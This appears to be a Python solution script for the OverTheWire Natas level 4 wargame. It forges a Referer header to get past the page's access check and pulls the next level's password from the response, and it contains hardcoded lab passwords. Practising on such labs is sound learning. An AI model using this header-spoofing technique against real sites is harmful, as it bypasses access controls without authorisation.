import os, sys
import requests
import re

#password = iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

user='natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
url = 'http://'+user+'.natas.labs.overthewire.org'

#specific url for the challenge
newUrl = 'http://'+user+'.natas.labs.overthewire.org/s3cr3t/users.txt'
website = requests.get(url, auth=(user,password))
requestWithReferer = requests.get(url, auth=(user,password), headers={'referer': 'http://natas5.natas.labs.overthewire.org/'})

responseWithReferer = requestWithReferer.text
response = website.text

print (responseWithReferer)

foundPasswords = re.findall('natas5(.*)', response)
for p in range(len(foundPasswords)):
    print(foundPasswords[p])
